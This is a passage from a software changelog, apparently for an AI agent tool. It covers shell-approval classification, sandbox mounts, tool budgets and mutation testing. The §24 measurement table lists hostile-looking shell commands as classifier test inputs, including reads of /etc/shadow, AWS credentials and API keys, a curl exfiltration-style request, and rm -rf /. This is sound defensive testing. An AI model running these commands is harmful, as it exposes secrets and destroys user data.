choosable. Where a test stands in for the model, it has authority over the model's options,
and any assertion about what the model *could* do is then circular.

This is the third distinct way this project has found a green suite to mean nothing, after
"a test that PATCHES the wiring cannot see the wiring break" (§23's sign-off memo) and "a fix
that shrinks a set turns every negative about it into a tautology" (batch 6). The remedy is
the same each time and it is not more tests: assert one layer further out than the defect can
reach. Here that is the `tools` argument on the wire.

### Verified on Linux

`python:3.11-slim`, fresh `pip install -r requirements.txt`, `providers.json` from the
example: **1707 passed, 0 skipped, 1 deselected** (re-run after the pre-merge review). The fifteen tests that `skipif` on Windows
all run and pass there, so the headline count is measured where nothing skips. The review's three new
mutations were re-run there too, each RED on the test named for it -- and read by NAME
in the output rather than inferred from an exit code, which is the false-RED lesson below.

The wire measurement re-taken in the container:

```
--grant-tools X                granted on wire: True   (14 tools)
--grant-tools X --attended     granted on wire: True   (17 tools)
no flags                       granted on wire: False  (13 tools)
```

The run also emitted **two distinct headless notices**, which is `headless_hidden(granted=)`
doing its job — the granted run's notice omits the tool the ungranted run's names:

```
not advertising remember, spawn_subagent, write_project_doc                    <- granted run
not advertising mcp__demo__post, remember, spawn_subagent, write_project_doc   <- no flags
```

**Two container-only failures, both in the harness rather than the code, and both worth
recording** because each is a way a verification run lies:

- The wire measurement first died on `no such table: conversationthread`. A research pass
  persists a thread, and a fresh container has no `app.db` — it had only ever worked on
  Windows because a long-lived local database already had the table. That is verbatim the
  gotcha ARCHITECTURE §11 records about `pipelinerunrecord`, met from the other side.
- The `#159` config mutation reported a **false GREEN**: the needle was LF and `config.py` is
  CRLF, so it never applied and the tests passed for the ordinary reason. Caught only because
  the harness asserts the byte count changed after writing. **A mutation that fails to apply
  is indistinguishable from a surviving mutant unless the application itself is checked** —
  which is why every mutation in this project is EOL-normalised, byte-diffed, and
  `py_compile`d before pytest is allowed to run.

### The mutation harness produced a FALSE RED, mirroring the false GREEN above

`R13-enforcement-truthiness-instead-of-is-None` (`answered_by_name = signoff is None` ->
`not signoff`) was reported RED and **actually survives the whole suite.** The harness passed
a two-file test spec as a *single* argument, so pytest got `"tests/test_agents.py
tests/test_grants.py"` as one path, errored, and the non-zero exit read as a kill.

So both directions are now on record, from the same batch:

| | cause | what it looks like |
|---|---|---|
| **false GREEN** | the needle never applied (LF vs CRLF) | a surviving mutant, i.e. a missing test |
| **false RED** | pytest failed for a reason unrelated to the mutation | a covered guard, i.e. a test that does not exist |

The false RED is the more dangerous of the two: a false GREEN sends you looking for a test you
then write, while a false RED tells you to stop. **A mutation pass has to check that the
failure it saw is the failure it expected**, not merely that the exit code was non-zero — the
harness now splits the spec, drops `-x` so the killing test is visible in the tail, and every
mutation carries the name of the test that should kill it so the two can be compared by eye.

The surviving mutant was real and is now covered. `test_s1_signoff_is_remembered_per_agent_
not_per_tool_name` answers the sign-off with a **non-empty** set, which is truthy either way,
so it could never discriminate. `test_an_EMPTY_signoff_is_remembered_too` answers with
`set()` — spawn the agent, grant it nothing — which is a real answer and is falsy.

### Note on §21's row for the headless denial string

Any earlier row asserting the exact text `"requires approval and was not given"` still holds
**only where a channel exists**. Headless, that string now differs by whether the tool was
gated by name or by its arguments. The change is deliberate and the old wording was the
defect: it told the model to retry with approval in the one situation where approval cannot
be obtained.


---

## §24 — the eighth fix batch: the shell capability classifier (2026-08-18)

Closes audit **#157** (S1) and **#50** (S3). ROADMAP_v2 **§28**, decisions **G1–G7**.

### The config change that breaks things, stated first

**`ToolApprovals.shell` ships `False` instead of `True`, and `config.SHELL_APPROVAL_MODE` ships
`"tiered"`.** These move together or neither means anything — see below. If you have a fork, a
patch, or a test that reads `ToolApprovals().shell` expecting `True`, it is now wrong.

`False` here does **not** mean "never ask". The gate is `SHELL_APPROVAL_MODE`. The field is the
ratchet: setting it `True` still forces `always`, because `approval_needed` ORs the tool's own
check with `requires_approval` and both read it. D14's one-way property is intact — a config or
an agent override can still only tighten.

### What breaks

| What | Before | After | Why |
|---|---|---|---|
| `ToolApprovals().shell` | `True` | `False` | While it was `True` the tool's check could never lower the answer, so `tiered` was unreachable dead code (G3) |
| `config.SHELL_APPROVAL_MODE` | did not exist | `"tiered"` | The gate. `always` / `tiered` / `never`; an unknown value **raises at import** |
| `_shell_approval_check(name, params)` | five-step ladder, four steps dead | classify → decide | Same signature, same registration; the body is replaced |
| `run_sandboxed(...)` | `(command, workspace_dir, shell_binary, docker_available)` | `+ profile=` | Optional. `None` classifies internally, so existing callers are unaffected |
| `run_sandboxed(...)` | never touched the filesystem | `os.makedirs(workspace_dir, exist_ok=True)` | #50. **A test passing a fictional `workspace_dir` now creates it** — the suite's own routing tests passed `"/tmp/ws"` and left a real `C:\tmp\ws` behind until they moved to `tmp_path` |
| `_run_inert` / `_run_subprocess_fallback` | caught `FileNotFoundError` | catch `OSError` too | #50's other half: a bad CWD is `NotADirectoryError` on Windows, which is **not** a `FileNotFoundError`, so it escaped the handler entirely |
| `_run_docker` argv | one `-v` | sometimes two | A `:ro` bind for `.venastine`, only when it is nested in the workspace **and** already exists (G6) |
| `settings.json` | `shell_approval_mode` → "unknown key" | rejected **by name** | G7, R12's rule on a third key |
| `shell` `ToolSpec` | no `approval_notice` | `_shell_approval_notice` | The prompt now says *where* the command runs |
| `classify_command(command, ws)` | — | total over any input | The gate is handed the model's raw tool input; `ShellParams` does not validate until `run()` |

### Before and after, measured

The defect first, because it is larger than #157 states. With `ToolApprovals.shell = False` and
both fallback flags at their shipped values:

```
docker=True   -> set of answers from _shell_approval_check, every command shape: {False}
docker=False  -> set of answers from _shell_approval_check, every command shape: {False}
```

No command reached a `True`. Step 4 was the only rung that could produce one, and it needs
`ALLOW_INSECURE_SANDBOX_FALLBACK=True`, which does not ship. The five-layer policy was a
pass-through for one boolean.

Then the same commands through the real gate, measured on Linux in `python:3.11-slim`:

```
command                     BEFORE (asked?)      AFTER (tier / containment / asked?)
cat /etc/shadow             False, on the HOST   HOST_READ      uncontained  True
grep -r sk-ant /            False, on the HOST   HOST_READ      uncontained  True
cat ~/.aws/credentials      False                SANDBOXED      contained    False
curl https://a/?d=x         False, with egress   SANDBOXED_NET  contained    True
pip install evil            False, with egress   SANDBOXED_NET  contained    True
ls -la                      False                INERT          uncontained  False
cat notes.txt               False                INERT          uncontained  False
python x.py                 False                SANDBOXED      contained    False
```

`cat ~/.aws/credentials` reads oddly and is correct: `~` is a metacharacter, so the command was
never inert, and in a container `~` is the container's home.

### Exactly one thing got looser

Read-only commands whose every argument resolves inside the workspace are auto-approved, where a
pre-§28 user with `ToolApprovals.shell = True` was prompted. `ToolApprovals.read` is already
`False`, so `read` on a workspace file was unprompted while `cat` on the same file prompted —
that inconsistency is what went away. Everything else is unchanged or strictly tighter.

`SHELL_APPROVAL_MODE = "never"` **is** the old loose configuration, kept on purpose. The fix is
not that it became unreachable; it is that reaching it means writing the word `"never"` rather
than switching off a field that reads like "stop nagging me".

### Vacuity classes

Nothing new this batch, but two known ones bit and are worth the record.

**A check that passes because its input was empty.** `CommandProfile` originally had no
`measured` field. A profile the classifier could not characterise answers `False` to every
capability question, so the CONTAINED branch approved it *for having no network* — an
unmeasurable command auto-approved by the containment argument. The field exists to make
"we could not tell" unarguable, and it is where batch 9's "the model is not sure" has to land.

**A test whose premise is the thing under change.**
`test_ac3_context_false_does_not_suppress_tool_approval_check` pinned D14's ratchet using
`rm -rf /` and a docstring that said it worked *because* `ToolApprovals.shell` defaulted `True`
and step 1 returned before anything read the command. Flipping that field made `rm -rf /`
genuinely contained, so the test would have been asserting the override rather than the tool.
It now uses `cat /etc/shadow`, whose answer comes from the tool under every configuration and
without probing Docker.

### Mutation pass

Fourteen mutations, thirteen red on a test named for each, one green control, `git status
--short` clean after restore. Two came back other than predicted:

| mutation | predicted | actual | what it taught |
|---|---|---|---|
| `.venastine` **nested** half deleted | GREEN — `os.path.join` always produces a nested path, so the guard looked unreachable | GREEN on Windows, **RED on Linux** | The reasoning was wrong: `realpath` resolves **symlinks**, so a `.venastine` symlinked at `/etc` escapes. Now killed by a test needing directory symlinks — which skips on Windows, so this guard is verified **only** in the container (§21's rule) |
| `SHELL_APPROVAL_MODE` flipped to `"never"` | GREEN — nothing pins the shipped value | **RED** | It was pinned by accident, by a §7 fallback test that happens not to set the mode. Coverage by accident moves the moment that test sets it, so it now has a test that states it |

### Verified outside the suite

The `.venastine` mount's semantics are **measured in a real container**, not asserted from
memory: `/workspace` writable, the subtree `EROFS`, `rm` and `mv` on the mountpoint refused with
`EROFS` and `EBUSY`, reads unaffected, host copy byte-identical, and the container's write to
`/workspace` visible on the host so builds still work.

And the hazard the `isdir` half exists for is real: `docker run` with a missing bind source
**creates it on the host**, and an empty `.venastine/` flips `is_trusted()` from `True` to
`False` on its own. An unconditional mount would have conjured a directory into the user's
project and then prompted them to trust it.

### Platform note

`test_a_windows_drive_and_a_unc_path_escape_on_windows` is skipped off Windows, and that is a
statement about paths rather than a gap. `os.path.join` on POSIX reads `C:/Users/x` as a
relative directory named `C:`, so it stays inside the workspace — and it should, because it
names nothing outside it there. The escape is real only where the syntax is. The Linux
container is what found the combined assertion wrong.

### Verification

| | |
|---|---|
| Windows | **1742 passed, 16 skipped, 1 deselected** |
| `python:3.11-slim` | **1757 passed, 1 skipped, 1 deselected** |
| the one Linux skip | `test_a_windows_drive_and_a_unc_path_escape_on_windows`, by design — see the platform note above |
| mutations | 14; 13 red on a test named for each, 1 green control, `git status --short` clean after restore |
| the Linux-only mutation | `.venastine` nested guard: GREEN on Windows (its test skips), **RED in the container** |
| outside the suite | `python main.py --help` exit 0 and `import tui.app` on both platforms; the `:ro` mount measured in a real container |

The two totals agree: 1742 + 16 = 1757 + 1 = 1758 collected.


---

## §25 — the ninth fix batch: the CLI shell (2026-08-19)

Closes audit **#100** (S1), **#7** (S2), **#101** (S3), **#102** (S3) and **#141** (S4).
ROADMAP_v2 **§29**, decisions **N1–N8**.

> This file's section counter runs independently of ROADMAP_v2's, so this `§25` is the ninth fix
> batch and the `§25` above is authorized tool use. §19–§23 already collide the same way. That is
> audit **#17**'s overloaded-namespace family and is left alone here rather than renumbered mid-batch.

### The change that breaks a test, stated first

**`builtins.input` is no longer a seam any test can use to drive the CLI.** `main.py` reads stdin
through exactly one object now — that is the fix for #100 — so patching `input` reaches nothing.
Six call sites across `test_e2e.py`, `test_memory_shells.py` and `test_shell_compaction.py` move to
`tests/conftest.py`'s new `cli_stdin` fixture:

```python
mocker.patch("builtins.input", side_effect=["hello", EOFError()])   # before
cli_stdin("hello")                                                  # after
```

`FakeStdinReader` records `prompts` and `timeouts`, so a test can assert on what the user was asked
and whether the question carried a deadline at all.

### What breaks

| What | Before | After | Why |
|---|---|---|---|
| `_StdinReader.ask(prompt, timeout)` | timeout required | `timeout=None` optional, meaning **wait forever** | N2. A caller relying on the positional gets no deadline instead of one |
| `_StdinReader` | one method | `+ readline(prompt)`, `_EOF`, `_eof`, `_start`, `_ended` | N1/N3 |
| `build_attended_provider(honour_run_scope)` | — | `+ timeout=` | N2. The default is a **sentinel**, resolved in the body, so `conftest`'s `shrink_approval_timeout` keeps working |
| `_prompt_review_decision(reader, finding, round)` | — | `+ timeout=` | Same, for the channel that calls it |
| the channel returned by `build_attended_provider` | — | `+ .rendered_kinds` | Read by the parity test; nothing in production branches on it |
| `main.py` | no `main()` | `main(argv=None) -> int` | N7. `if __name__` is now two lines |
| `main.py --no-review` in chat | accepted, ignored | **`parser.error`, exit 2** | N8. A script passing it unconditionally starts failing |
| `main.py --review` in chat | accepted, ignored | **`parser.error`, exit 2** | N8 |
| `--help`, a typo'd flag | created `app.db` + `logs/` | create nothing | N6 |
| `--memories` / `--summary` / `--init` | ran the legacy sweep | skip it | N6. None of them shows the thread picker the sweep exists for |
| CLI `--init` prompts | hand-written, `input()`, blocked forever | the response channel, still blocking | N5/N2. Wording changes slightly; the affordances do not |
| `settings.json`, config | unchanged | unchanged | nothing here reads either |

### Before and after, measured

```
#100, under a REAL pty -- the only place two blocked readers on one tty can be seen
  before  (input)      APPROVAL_GOT='y\n'   CHAT_GOT never printed, child still running
  after   (readline)   APPROVAL_GOT='y\n'   CHAT_GOT='the next question'
  Ctrl+D  (readline)   CHAT_EOF             (N3)

#7, does the CLI put the question to a human at all?
  approval yes | subagent_signoff yes | question yes | review yes
  confirm  NO -> yes        (silently decoded False before)
  choice   NO -> yes        (silently decoded None before)

#101, in a fresh empty directory
  before  --help     -> app.db (77824 bytes) + logs/    exit 0
  after   --help     -> nothing                          exit 0
          --notaflag -> nothing                          exit 2
```

### The one thing that did NOT change, and was checked rather than asserted

N2 moves the deadline from a constant read inside each handler to a property of the channel. It is
meant to change nothing for the four run-backed prompts, so the rendered prompt strings were captured
before and after and diffed. Identical, including `"  Allow? [y/N] (600s): "`. `QUESTION` rendered no
deadline before and still does not.

### Vacuity classes

**A test whose seam the fix removes.** Six tests drove `run_chat` by patching `builtins.input`. After
N1 they exercised a function nothing calls. They did not fail — they *hung*, because the reader was
waiting on a queue nobody was filling, which is a worse failure than a red test and the reason the
mutation harness now reports HANG as its own outcome.

**A guard whose test targets the wrong line.** The first `N5-init-handed-a-channel-on-a-pipe`
mutation deleted `channel = build_attended_provider(...) if interactive else None` and came back
GREEN. Correctly: building a channel on a pipe is harmless, because what decides whether `generate`
gets a consent route is `confirm=_confirm if interactive else None` at the **call**. A surviving
mutant with a confident explanation is the one to distrust — §28's lesson, arriving again, and this
time the explanation was mine.

**A fixture that keeps passing and stops working.** `shrink_approval_timeout` documents "read at call
time, so patching the module attribute is enough". A `timeout=config.ATTENDED_APPROVAL_TIMEOUT_S`
default argument is evaluated at import and silently takes that away. Nothing goes red; the fixture
simply stops shrinking anything, and the next unanswered prompt stalls the suite for ten minutes
instead of failing it.

### Mutation pass

24 mutations, one green control, `git status --short` clean after restore. Two came back other than
predicted and both mattered:

| mutation | predicted | actual | what it taught |
|---|---|---|---|
| `--init` handed a channel on a pipe | RED | **GREEN** | It targeted the channel construction; the load-bearing guard is at the `generate()` call. Retargeted, then RED |
| the pump's EOF publication | RED | **HANG** | A mutation that strands a reader does not fail the suite, it stops it. HANG is now a reported outcome, and counts as a kill only where RED was expected |

### Platform note

Windows has no `pty` module, so #100's probe — the only thing that can see two blocked readers on one
terminal — runs **only** in the container. §21's rule applies exactly: this defect is not verified
until the probe runs where a pty exists. What Windows *can* answer is whether N1 costs anything: a
reader parked with no deadline is not woken by `_thread.interrupt_main()`, and neither is `input()`,
and neither is `ask`'s timed wait; under a real console control event all three exit identically with
`STATUS_CONTROL_C_EXIT`.


---

## §26 — the tenth fix batch: the pipeline's payload boundary (2026-08-20)

> **Section-number collision, named rather than renumbered.** This file's counter is independent of
> ROADMAP_v2's — §19–§23 and §25 already collide the same way — so this §26 is the tenth fix batch,
> and the earlier §26 is §26 of ROADMAP_v2's numbering. Audit **#17** owns the overloaded-namespace
> family; extending the collision silently is what that issue is about.

Closes audit **#76** (S1), **#75** (S2), **#78** (S3), **#79** (S3) and **#123** (S3).
ROADMAP_v2 **§30**, decisions **B1–B11**.

### The change that breaks a test, stated first

**A pass's SHAPE is now part of its contract, not just its parseability.** A test double that queues
`{"ok": true}` for a pass whose prompt promises an array now spends every corrective retry and then
fails the run. Seven such doubles existed, in four files, and they were possible only because nothing
checked:

```python
make_model_response(text='{"ok": true}')        # before
make_model_response(text=well_shaped("Pass 2")) # after
```

`tests/conftest.py` grows `well_shaped(pass_id)` — the smallest payload each pass accepts — in ONE
place, so the next spec change moves one line rather than nine.

### What breaks

| What | Before | After | Why |
|---|---|---|---|
| a pass payload that parses but is the wrong shape | applied, or silently discarded | a corrective retry, then `PayloadShapeError` → `status='failed'` | B2. A run that used to complete with wrong data now fails with a message naming the pass and the field |
| a pass payload naming ids that match **nothing** | silently skipped, trace reported success | the same failure | B5 |
| a pass payload naming ids that match **some** | unchanged | unchanged — applied, and the trace reports how many | B5's control. Deliberate: one stray id must not kill a nine-pass run |
| two claims sharing an `id` | accepted, and split across the two lookups | rejected at Pass 2 | B6 |
| `retry_until_json(...)` | — | `+ validate=` (defaults to `None`, so §20's reviewer is unchanged) | B2 |
| `_run_pass_with_json_retry(...)` | — | `+ claim_ids=`, `+ ensemble=`; still returns `str` | B3 |
| `_apply_grounding` / `_apply_critic` / `_apply_assumption_flags` | `-> None` | `-> int`, the number of claims touched | B5 |
| `PipelineRun.claim_by_id` | its own `next(...)` | `base.resolve_by_id(...)`, first wins | B6 |
| **`score_breakdown`'s keys**, in `04_confidence.json` and `/claims` | `grounding_component` on every claim; `disagreement_penalty` on every claim of an ensemble run | `+ formula`; `grounding_component` **only** on the factual branch; `+ capped_critic_component` on the non-factual one; `disagreement_penalty` is what was applied; `+ consistency_reported` when a clamp fired; `+ unrecognised_grounding_status` / `unrecognised_type` when one was coerced | B10. A reader can now reconstruct `raw_score` from the stored fields; before, a non-factual claim's fields gave 0.25 against a stored 0.65 |
| `consistency_score` on an ensemble run | always a number | **`None` when Pass 2 reported nothing** | B7. Absent and zero were indistinguishable, and only one is a statement about the claim |
| three checkpoint trace lines | reported the count the pass was ASKED about | report the count APPLIED | B5. Anything matching on the old wording moves |
| `prompts/claim_extraction.md` | asks for `asserted_by_candidates` only on multi-candidate claims | asks for it on every claim in ensemble mode | B7 |
| an unrecognised `grounding_status` reaching Pass 4 | weight 0.0, and it ESCAPED the forced-UNVERIFIED rule | scored as `ungrounded`, traced | B9 |
| an unrecognised `type` reaching Pass 4 | the non-factual branch, capped at 0.65 | the factual formula, traced | B9 |
| `settings.json`, config, the database schema | unchanged | unchanged | nothing here reads or writes either |

### Before and after, measured

```
#76, driven end to end with the model refusing to correct
  Pass 2 wraps its list   AttributeError: 'str' object has no attribute 'items'
                     ->   Pass 2: expected a JSON array, got object. Return the array
                          itself, not an object wrapping it.

  Pass 3b severity="0.0"  TypeError: unsupported operand type(s) for -: 'float' and 'str'
                          (raised in PASS 4, two passes downstream)
                     ->   Pass 3b: entry 0 has severity='0.0', which is string; expected number.

  the two SILENT ones, which completed a run and reported success:
  Pass 5 flags at top      "Pass 5: assumption audit complete, 0 claim(s) flagged."
                     ->   Pass 5: the response is missing required key(s) 'per_claim_flags'.
  3a/3b unknown ids        "Pass 3a: grounded 4 unique entities across 3 factual claim(s)."
                     ->   Pass 3a: not one of the 3 claim_id value(s) matches a claim you
                          were given (got '1', '2', '3'; expected ids like 'C1', 'C2', 'C3').

#75.1, grounded factual, severity 0.2143, three-model roster
  [1, 2, 3, 3] one repeat    HIGH 0.825 penalty -0.05  ->  MEDIUM 0.775 penalty 0.0
  [1, 2, 3, 4] out of range  HIGH 0.825 penalty -0.05  ->  MEDIUM 0.775 penalty 0.0, reported 1.3333

#75.1b, the same claim with the field ABSENT
  MEDIUM 0.70 penalty 0.15   ->  HIGH 0.85 penalty 0.0, consistency None

#75.2
  'Ungrounded' -> LOW    ->  UNVERIFIED        'Factual' -> MEDIUM  ->  UNVERIFIED
```

### The one thing that did NOT change, and was checked rather than asserted

A well-formed run's full trace and every claim's breakdown were captured before and after and
diffed. The only differences are the three B5 lines and B10's keys — no tier moved, no `raw_score`
moved, and §10's byte-for-byte non-ensemble guard still holds: with `ensemble_n == 0` no consistency
field is recorded at all, exactly as before.

### Vacuity classes

**A test double the fix invalidates.** Seven queued payloads no pass would ever emit. They did not
fail — they *retried*, three times, and then failed the run with a message about a shape the test
never meant to be about. The fix makes the doubles more honest than they were.

**Two guards overlapping on one input.** `B8-dedupe-removed` survived because the clamp pulls
`[1, 2, 3, 3]`'s 4/3 back to exactly the deduped answer. The test could not tell which guard was
working. The discriminating input — a repeat that stays *below* the denominator — is the one that
states the defect without the other guard's help.

**A rule asserted in a comment.** `payload_validation.py` copies `review.py`'s "type guards BEFORE
the membership tests" by name and explains why. Deleting the guard left the suite green: the only
unhashable-value test aimed at a field checked by a different branch.

### Mutation pass

34 mutations, one green control, `git status --short` clean after restore, and the whole table re-run
inside `python:3.11-slim` where six of the Windows skips are live — **34/34 on both**. The two
survivors above were fixed in the tests, not the code, and the control came back RED once for a
reason that was not the mutation: the documented test count had drifted behind two newly added
tests. That is exactly the false-RED the control exists to separate.

### Platform note

Nothing in §30 is platform-specific — the boundary is pure Python over already-parsed JSON — and
that is worth confirming rather than assuming, which is what the container mutation run does. Every
number matches Windows to the digit.


---

## §27 — the eleventh fix batch: what a tool call is allowed to cost (2026-08-20)

> **Section-number collision, named rather than renumbered.** This file's counter is independent of
> ROADMAP_v2's — §19–§23, §25 and §26 already collide the same way — so this §27 is the eleventh fix
> batch. Audit **#17** owns the overloaded-namespace family; extending the collision silently is what
> that issue is about.

Closes audit **#57** (S1 — the last one), **#55** (S3) and **#56** (S3).
ROADMAP_v2 **§31**, decisions **H1–H10**.

### The change that breaks a registration, stated first

**`ToolSpec` has a new REQUIRED field.** `budget` must be one of `BUDGET_COMPUTE`, `BUDGET_IO` or
`BUDGET_HUMAN`, and `assert_budget_declared()` runs at `tools/registry.py` import. Any out-of-tree
registration — a fork's extra tool, a branch mid-rebase — now fails at import with the tool named,
not at its first call.

That is deliberate and it is R13's trade, unchanged: `None` means undeclared rather than defaulting,
because an unwrapped tool looks, from every layer above it, exactly like a tool that is bounded
somewhere else. A default would have recreated #57 silently for the next tool added.

`mcp__*` names are exempt — they are named at connection time and cannot carry a static declaration —
and `mcp_client/registration.py` passes `BUDGET_IO` explicitly anyway, so the exemption is
documentation rather than the live path.

### If you change this, this is what fails

| change | what fails | why it is that way |
|---|---|---|
| Drop `budget=` from any registration | `assert_budget_declared` raises at import; `test_every_statically_registered_tool_declares_a_budget` names the tool | R13's rule. Omission has to be a detectable mistake, not an inherited answer |
| Give `ToolSpec.budget` a default value | The same tests pass while the mechanism silently stops covering new tools | This is the exact failure the field exists to prevent; the value of `None` is that it is not an answer |
| Misspell a budget (`"computee"`) | `test_a_misspelled_budget_is_fatal_rather_than_ignored` | A typo drops the tool out of the mechanism *while looking answered*, which is worse than an omission |
| Declare a `BUDGET_COMPUTE` tool that also injects | `test_a_compute_tool_that_declares_an_injection_is_fatal` | Not a style rule: compute routes through a process boundary and nothing in `_INJECTABLE_PARAMS` survives one. Caught at import instead of at the first call |
| Route `BUDGET_HUMAN` through the compute clock | `test_ask_user_is_not_bounded_by_the_compute_budget` | `ask_user` blocks on a person for up to `ATTENDED_APPROVAL_TIMEOUT_S` (600s). A 15s clock would answer the question on the user's behalf |
| Replace the subprocess with a thread watchdog | `test_a_timed_out_call_is_STOPPED_not_merely_abandoned` | Every other test in that class would still pass. sympy has no interruption point, so a thread keeps a core busy while the harness reports a timeout that did not happen |
| Measure that property with `os.times()` | Nothing fails — and that is the point | `children_user`/`children_system` are always **0.0 on Windows**, so the assertion would be trivially true on the platform it usually runs on. It measures bytes the child wrote to disk instead |
| Isolate inside the six math tools rather than at `dispatch` | 131 tests in `test_math_tools.py` start measuring the transport | They call `module.run(params)` directly and never `dispatch`. Keeping the seam at the one production handler call site is what keeps them about the maths |
| Delete `_interpret`'s negative-returncode branch | `test_a_child_killed_by_its_own_cpu_limit_reports_the_limit` | On Unix RLIMIT_CPU kills the CHILD, so `subprocess.run` returns rather than raising `TimeoutExpired`. Without this branch Linux reports `did not return a usable result (exit -9)` where Windows names the limit — the better-protected platform giving the worse answer |
| Widen it to `returncode != 0` | `test_a_crashed_child_is_NOT_reported_as_a_limit` | A child that exits non-zero without a signal has a bug, not a budget problem. Telling a model to try smaller numbers sends it round a loop that cannot end |
| Give the two bounds separate wordings | `test_both_bounds_give_the_SAME_sentence` | They are the same event to the only reader that matters. Two copies is how they drifted in the first place |
| Reuse `sandbox._unix_resource_limits` for the child | Nothing fails, and the inner layer stops existing | It spends `SANDBOX_CPU_SECONDS` (30), which is *above* the 15s budget — a limit that can never fire, reading to anyone checking as though H3 were present |
| Restore `pow(base, exponent, modulus)` with an optional modulus | `TestModularExponentIsModular` | `pow(b, e, None)` is plain exponentiation: 0.000s with a modulus, 3.3s and 125 MB without, on the same exponent |
| Move `str(result)` back outside `discrete_math.run`'s try | `TestAResultTooLargeToPrintIsTheToolsOwnError` | An ordinary input produced a bare `ValueError`, dispatch's generic wrapper, and a `logger.exception` traceback as though it were a bug |
| Stringify the dict branch's VALUES while fixing that | `test_a_dict_result_still_carries_its_values_untouched` | The first draft did. It rewrote every `prime_factors` exponent, and the corpus diff caught it |
| Drop `edit_run`'s size guard | `TestEditRejectsAnOversizedFileBeforeOpeningIt` | 60 MB of peak traced memory on a 30 MB file, to answer "old_text not found in file" |
| Give `read_project_doc` a `getsize` guard instead of the seek | `test_a_LATER_page_does_not_re_read_the_prefix_into_memory` | A size check would refuse the large document `/init` is meant to page through, and would leave the per-page re-read in place |
| Replace `fetch_url`'s cap with a `Content-Length` check | `test_a_lying_content_length_changes_nothing` | A hostile server can omit the header or lie about it. Only refusing to keep reading is a bound |
| Have the fake's `iter_bytes` yield one chunk | `test_the_read_stops_at_the_byte_cap` stops discriminating | One giant chunk satisfies any cap on the first iteration, so the double would decide the outcome instead of the code |
| Point the two real-httpx tests back at `httpx.get` | They reach for a real socket and error in `socket.py` | §31 moved the tool to `httpx.stream`. Those two drive REAL httpx through a MockTransport precisely so they can prove a blocked hop was never requested, so they must stub the entry point the tool calls |
| Check for committed checkpoints with a filesystem walk | It fails on any machine with notebook history | This working tree has eight `.ipynb_checkpoints` directories and exactly one was ever committed. A test people learn to ignore protects nothing — it asks git what is tracked |
| Check for them via `.gitignore` instead | It reports clean while the files sit there | `.gitignore` already listed `.ipynb_checkpoints/`, and gitignore does not untrack. That is how both files survived |

### Behaviour changes a caller can observe

| before | after |
|---|---|
| A compute tool ran in-process under `dispatch` | It runs in a child. `module.run(params)` is unchanged, but **patching a math tool's internals no longer affects a *dispatched* call** — the child imports a fresh module |
| `modular_exponent` with no modulus computed a plain power | An error naming the field, in 0.36s instead of 3.3s |
| `factorial n=100000` returned `"discrete_math failed: Exceeds the limit (4300 digits)…"` plus a logged traceback | The tool's own error, saying to try smaller inputs, with no traceback |
| `read_project_doc`'s message said `Read characters 0-20000 of 30000993` | `Read characters 0-20000.` The total **was** the whole-file read being removed, and `os.path.getsize` would substitute bytes for characters — a number that looks exact and is not |
| `edit` on a file over `MAX_FILE_SIZE_BYTES` reported `old_text not found` | It reports the size refusal, in read's wording |
| `fetch_url` buffered the whole body, then sliced | It streams and stops at `MAX_CONTENT_BYTES`; `truncated` is now True when *either* bound bit. A redirect costs no body at all |
| The offline `httpx` fake had `get` only | It also has `stream`, and `_Response.iter_bytes` |

### Vacuity classes

**A test whose input is already zero on the platform it runs on.** The first version of
`test_the_cpu_is_reclaimed` used `os.times()`, whose child-CPU fields are hard-wired to 0.0 on
Windows. It passed. It would have passed with the subprocess replaced by a thread, with the timeout
deleted, with the whole mechanism removed — the assertion was `0.0 < 0.5`. Caught by asking what the
measurement would read if the code were wrong, rather than by watching it go green.

**A test asserting an absence that a never-started process also produces.** Its replacement asserts a
file *stopped* growing, which is equally true if the child never ran. `test_the_probe_would_notice_a
_child_that_kept_going` is the positive control: same handler, observed while still running.

**A double that cannot express the thing under test.** The offline httpx fake had no `stream`, so
`fetch_url`'s new bound was unreachable through it. Adding one chunk-at-a-time `iter_bytes` is what
makes the cap testable at all — batch 10's lesson (turning on a check makes the doubles part of the
contract) with a different tool.

### Platform note

H3's second layer is POSIX-only and its two tests skip on Windows. That makes the container run
load-bearing rather than confirmatory: a guard whose test can skip is not verified until the mutation
runs where the test does (§21's rule).


## §28 — the twelfth fix batch: the catalogs (2026-08-21)

> **Section-number collision, named rather than renumbered.** This file's counter is independent of
> ROADMAP_v2's — §19–§23 and §25–§27 already collide the same way — so this §28 is the twelfth fix
> batch, recorded in ROADMAP_v2 **§32**. Audit **#17** owns the overloaded-namespace family.

Closes audit **#68** (S2), **#131** (S2, security), **#69** (S3), **#70** (S3), **#71** (S3) and
**#72** (S3). ROADMAP_v2 **§32**, decisions **A1–A11**.

### The two changes that break a file outside this repository, stated first

**1. A harness-tier agent must declare `spawnable`.** `config_loader.assert_spawnable_declared()`
runs inside `initialize()` and raises `RuntimeError` naming every offender. A fork's extra
`agents/builtin/*.md` now fails at startup rather than being silently advertised as a delegation
target that cannot be fed.

The asymmetry is the decision: **user- and project-tier agents that omit it load as
not-spawnable and do not raise.** R13's "omission must be a detectable mistake" is a rule about
fields on things this project declares. Applied to a file someone else wrote it gives the wrong
answer — raising there would take down startup over a stranger's frontmatter, which is the trade
`_parse_md_file` refuses everywhere else in that module.

**2. `name` and `description` are rewritten at parse time.** `_catalog_text()` collapses all
whitespace to single spaces and truncates at `config.MAX_CATALOG_TEXT_CHARS` (300). A multi-line
description is no longer multi-line, anywhere. Every shipped file already complies —
`test_no_shipped_description_is_altered_by_the_bound` asserts it — so nothing in this repository
changes shape, but a project relying on a formatted description will see it flattened.

### If you change this, this is what fails

| change | what fails | why it is that way |
|---|---|---|
| Point `with_catalogs` back at `registry.is_allowed` | `test_a_gated_load_skill_suppresses_the_SKILL_catalog_too` for the skill half; `test_no_pass_prompt_invites_a_tool_the_pass_cannot_call` for the agent half | `is_allowed` is POLICY — "is this tool permitted", not "can this run call it". The skill half is the narrow one: the two agree everywhere the shipped install reaches, and differ only for an agent declaring `approval_overrides: {load_skill: true}` on a headless run |
| Give `is_advertised` a filter of its own instead of the one `schemas()` uses | `test_is_advertised_agrees_with_schemas_for_every_tool`, parametrised over both modes and every registered tool | A wrapper that merely LOOKED like the filter would pass a test naming one tool. Agreement is the property A1 buys, so it is asserted over the whole registry |
| Write `headless_hidden()` as a hand-copied negation again | `test_headless_hidden_is_exactly_the_difference` | #67/#133 are what a shared mechanism with a duplicated policy costs. It is now literally "advertised attended, not advertised headless" |
